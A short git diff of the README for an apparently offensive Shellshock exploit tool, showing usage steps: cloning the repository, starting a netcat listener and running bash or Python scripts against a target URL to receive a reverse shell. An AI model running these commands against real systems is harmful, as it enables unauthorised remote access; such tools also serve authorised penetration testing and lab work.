@@ -1,7 +1,7 @@
 
 ## How to use
 
-#### Clone the project (or just copy-paste)
+#### Clone the repository (or just copy-paste the one you prefer)
 ```bash
   sudo git clone https://github.com/Gurguii/shellshock.sh
 ```
@@ -10,7 +10,12 @@
   netcat -lvnp <lport>
 ```
 #### Run the script
+- Bash
 ```bash
-    bash shellshock.sh <url> <lhost> <lport>
+    bash shellshock.sh -u <url> -h <lhost> -p <lport>
 ```
-No worries if you forget setting the listener, the script will wait if <lport> is not listening before sending the reverse shell.
+- Python
+```bash
+    python3 shellshock.py -u <url> -lh <lhost> -lp <lport>
+```  
+Note: default LPORT is 4444, URL and LHOST required.
